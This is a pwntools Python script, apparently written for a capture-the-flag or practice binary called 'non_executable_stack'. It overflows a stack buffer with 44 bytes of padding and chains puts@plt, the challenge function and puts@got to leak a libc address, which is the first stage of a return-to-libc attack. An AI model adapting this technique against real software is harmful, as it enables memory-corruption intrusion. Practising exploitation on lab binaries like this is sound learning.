#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('./non_executable_stack')
p = process('./non_executable_stack')

puts_plt = elf.plt['puts']
chall_addr = elf.symbols['chall']
puts_got = elf.got['puts']

print(f"[*] puts@plt: {hex(puts_plt)}")
print(f"[*] chall: {hex(chall_addr)}")
print(f"[*] puts@got: {hex(puts_got)}")

# Esperar prompt
data = p.recv(timeout=1)
print(f"[*] Received: {data}")

# Enviar payload
offset = 44
payload = b'A' * offset
payload += p32(puts_plt)
payload += p32(chall_addr)
payload += p32(puts_got)

print(f"[*] Sending {len(payload)} bytes")
p.sendline(payload)

# Ver qué pasa
p.stream()
